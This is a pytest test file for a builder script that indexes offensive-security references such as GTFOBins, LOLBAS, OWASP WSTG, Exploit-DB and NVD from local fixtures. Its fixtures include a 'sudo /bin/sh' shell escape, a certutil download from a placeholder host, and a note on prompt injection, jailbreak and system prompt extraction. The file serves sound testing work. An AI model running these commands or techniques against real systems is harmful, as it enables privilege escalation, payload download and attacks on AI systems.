"""Coverage for scripts/build_kb.py — the KB builder. Exercises every ingester over
LOCAL fixtures (no network), the offline build→index→query pipeline, write_flat
(per-doc + bulk), status(), selftest(), and the main() CLI dispatch.

Network fetchers (fetch_repo / fetch_url / fetch_*csv) are never called: ingesters
are driven directly on fixture `raw` dirs, and build() runs with offline=True against
pre-seeded kb/sources/_raw/."""
from __future__ import annotations

import importlib.util
import json
from pathlib import Path

import pytest

from core import kb as kb_mod

# path-load scripts/build_kb.py (no scripts package)
_BK_PATH = Path(__file__).resolve().parent.parent / "scripts" / "build_kb.py"
_spec = importlib.util.spec_from_file_location("build_kb", _BK_PATH)
build_kb = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(build_kb)


@pytest.fixture
def kb_env(tmp_path, monkeypatch):
    """Isolated kb/ root (+ raw cache) and cwd, so the builder never touches the repo."""
    kb_root = tmp_path / "kb"
    (kb_root / "sources" / "_raw").mkdir(parents=True)
    monkeypatch.setattr(kb_mod, "KB_ROOT", kb_root)
    monkeypatch.setattr(kb_mod, "SOURCES_DIR", kb_root / "sources")
    monkeypatch.setattr(kb_mod, "RAW_DIR", kb_root / "sources" / "_raw")
    monkeypatch.setattr(kb_mod, "SESSIONS_DIR", kb_root / "sessions")
    monkeypatch.setattr(kb_mod, "INDEX_DB", kb_root / "index.db")
    monkeypatch.setattr(kb_mod, "MANIFEST", kb_root / "MANIFEST.json")
    monkeypatch.chdir(tmp_path)
    return kb_root


def _seed_light_sources(kb_root: Path):
    """Create minimal raw fixtures crafted so the selftest canned queries all hit."""
    raw = kb_mod.RAW_DIR
    # gtfobins: _gtfobins/<bin> yaml with a function carrying sudo/suid/shell contexts
    g = raw / "gtfobins" / "_gtfobins"
    g.mkdir(parents=True)
    (g / "sudo").write_text(
        "---\n"
        "functions:\n"
        "  shell:\n"
        "    - code: 'sudo /bin/sh'\n"
        "      contexts:\n"
        "        sudo: null\n"
        "        suid: null\n"
        "description: sudo lets a permitted user run a command as root\n",
        encoding="utf-8")
    # lolbas: _lolbas/<Cat>/<Name>.md frontmatter
    l = raw / "lolbas" / "_lolbas" / "Binaries"
    l.mkdir(parents=True)
    (l / "Certutil.md").write_text(
        "---\n"
        "Name: Certutil.exe\n"
        "Description: Download a file from the internet (certutil)\n"
        "Commands:\n"
        "  - Command: 'certutil -urlcache -f http://x/f file'\n"
        "    Description: Download a file to disk on Windows\n"
        "    Category: Download\n"
        "    MitreID: T1105\n"
        "---\n",
        encoding="utf-8")
    # wstg: a test page with the WSTG id + >200 chars about default credentials
    w = raw / "wstg" / "4.0" / "4-Web_Application_Security_Testing"
    w.mkdir(parents=True)
    (w / "04-Testing_for_Default_Credentials.md").write_text(
        "# Testing for Default Credentials\n\n"
        "WSTG-ATHN-02. Testing for default credentials means checking whether the "
        "application ships with well-known default usernames and passwords such as "
        "admin/admin. How to test: enumerate the product and vendor, then try the "
        "documented default credentials against the login form and admin console.\n",
        encoding="utf-8")
    # skill_refs: cwd-relative skills/ tree
    sk = Path("skills") / "ai" / "ai-redteam"
    sk.mkdir(parents=True)
    (sk / "SKILL.md").write_text(
        "# AI/LLM Red-Team Assessment\n\n"
        "Prompt injection, jailbreak, and system prompt extraction against the chat "
        "endpoint. Techniques: prompt injection, jailbreak, system prompt leak.\n",
        encoding="utf-8")


# ── individual ingesters ──────────────────────────────────────────────────────

def test_ingest_gtfobins(kb_env):
    _seed_light_sources(kb_env)
    docs = build_kb.ingest_gtfobins(kb_mod.RAW_DIR / "gtfobins", kb_mod.SOURCES_DIR / "gtfobins")
    assert docs and docs[0]["kind"] == "gtfobins"
    assert "sudo" in docs[0]["title"].lower()
    assert "suid" in docs[0]["tags"] and "shell" in docs[0]["tags"]


def test_ingest_lolbas(kb_env):
    _seed_light_sources(kb_env)
    docs = build_kb.ingest_lolbas(kb_mod.RAW_DIR / "lolbas", kb_mod.SOURCES_DIR / "lolbas")
    assert docs and docs[0]["kind"] == "lolbas"
    assert "certutil" in docs[0]["title"].lower()
    assert "download" in docs[0]["text"].lower()


def test_ingest_wstg(kb_env):
    _seed_light_sources(kb_env)
    docs = build_kb.ingest_wstg(kb_mod.RAW_DIR / "wstg", kb_mod.SOURCES_DIR / "wstg")
    assert docs and docs[0]["kind"] == "wstg"
    assert "WSTG-ATHN-02" in docs[0]["title"]
    assert "athn" in docs[0]["tags"]


def test_ingest_skill_refs(kb_env):
    _seed_light_sources(kb_env)
    docs = build_kb.ingest_skill_refs(None, kb_mod.SOURCES_DIR / "skill_refs")
    assert docs and docs[0]["kind"] == "skill_ref"
    assert "red-team" in docs[0]["title"].lower()


def test_ingest_exploitdb(kb_env):
    raw = kb_mod.RAW_DIR / "exploitdb"
    raw.mkdir(parents=True)
    (raw / "files_exploits.csv").write_text(
        "id,file,description,date_published,author,type,platform,port\n"
        "50123,exploits/php/webapps/50123.txt,VulnBank 1.0 - SQL Injection,2023-01-01,me,webapps,php,80\n",
        encoding="utf-8")
    docs = build_kb.ingest_exploitdb(raw, kb_mod.SOURCES_DIR / "exploitdb")
    assert docs and docs[0]["kind"] == "exploit"
    assert "sql injection" in docs[0]["text"].lower()


def test_ingest_nuclei(kb_env):
    raw = kb_mod.RAW_DIR / "nuclei" / "http" / "cves"
    raw.mkdir(parents=True)
    (raw / "CVE-2023-25577.yaml").write_text(
        "id: CVE-2023-25577\n"
        "info:\n"
        "  name: Werkzeug multipart DoS\n"
        "  severity: high\n"
        "  tags: cve,werkzeug,dos\n"
        "  description: Werkzeug before 2.2.3 is vulnerable to resource exhaustion\n",
        encoding="utf-8")
    docs = build_kb.ingest_nuclei(kb_mod.RAW_DIR / "nuclei", kb_mod.SOURCES_DIR / "nuclei")
    assert docs and docs[0]["kind"] == "nuclei"
    assert "werkzeug" in docs[0]["text"].lower()


def test_ingest_nvd(kb_env):
    d = kb_mod.RAW_DIR / "nvd" / "cves" / "2023" / "25xxx"
    d.mkdir(parents=True)
    (d / "CVE-2023-25577.json").write_text(json.dumps({
        "cveMetadata": {"cveId": "CVE-2023-25577"},
        "containers": {"cna": {
            "descriptions": [{"lang": "en", "value": "Werkzeug multipart resource exhaustion"}],
            "affected": [{"vendor": "pallets", "product": "werkzeug",
                          "versions": [{"version": "2.2.2", "status": "affected"}]}],
            "metrics": [{"cvssV3_1": {"baseScore": 7.5, "vectorString": "CVSS:3.1/AV:N"}}],
        }},
    }), encoding="utf-8")
    docs = build_kb.ingest_nvd(kb_mod.RAW_DIR / "nvd", kb_mod.SOURCES_DIR / "nvd")
    assert docs and docs[0]["kind"] == "cve"
    assert docs[0]["title"] == "CVE-2023-25577"


# ── write_flat (per-doc + bulk) ─────────────────────────────────────────────────

def test_write_flat_per_doc_and_bulk(kb_env):
    per = [build_kb._doc("kb:gtfobins/sudo", "gtfobins", "sudo (GTFOBins)", "body")]
    assert build_kb.write_flat("gtfobins", per) == 1
    assert list((kb_mod.SOURCES_DIR / "gtfobins").glob("*.md"))
    bulk = [build_kb._doc(f"kb:nvd/CVE-{i}", "cve", f"CVE-{i}", "x") for i in range(3)]
    assert build_kb.write_flat("nvd", bulk) == 3   # nvd is a bulk (chunked) source


# ── offline build → index → query → status → selftest ──────────────────────────

def test_offline_build_index_query_status_selftest(kb_env, capsys):
    _seed_light_sources(kb_env)
    light = ["skill_refs", "gtfobins", "lolbas", "wstg"]
    rc = build_kb.build(light, refresh=False, offline=True)
    assert rc == 0
    assert kb_mod.INDEX_DB.exists()
    # manifest written
    assert json.loads(kb_mod.MANIFEST.read_text()).get("gtfobins", {}).get("docs", 0) >= 1
    # index is queryable
    con = kb_mod.open_index()
    try:
        hits = kb_mod.query_index(con, "sudo suid shell", None, 8)
        assert any(h["kind"] == "gtfobins" for h in hits)
    finally:
        con.close()
    assert build_kb.status() == 0
    assert "index" in capsys.readouterr().out.lower()
    # selftest: canned queries crafted to hit → all pass
    assert build_kb.selftest() == 0


def test_build_offline_missing_cache_skips(kb_env, capsys):
    # gtfobins has a fetcher; offline with no cached raw → skipped, build still succeeds
    rc = build_kb.build(["gtfobins"], refresh=False, offline=True)
    assert rc == 0
    assert "skip" in capsys.readouterr().out.lower()


# ── main() CLI dispatch ─────────────────────────────────────────────────────────

def test_main_status(kb_env, monkeypatch, capsys):
    monkeypatch.setattr(build_kb.sys, "argv", ["build_kb.py", "--status"])
    assert build_kb.main() == 0


def test_main_selftest_no_index(kb_env, monkeypatch):
    monkeypatch.setattr(build_kb.sys, "argv", ["build_kb.py", "--selftest"])
    assert build_kb.main() == 1   # no index built → selftest fails cleanly


def test_main_no_args_prints_help(kb_env, monkeypatch, capsys):
    monkeypatch.setattr(build_kb.sys, "argv", ["build_kb.py"])
    assert build_kb.main() == 0
    assert "usage" in capsys.readouterr().out.lower()


def test_main_build_source_offline(kb_env, monkeypatch):
    _seed_light_sources(kb_env)
    monkeypatch.setattr(build_kb.sys, "argv",
                        ["build_kb.py", "--source", "gtfobins", "--offline"])
    assert build_kb.main() == 0
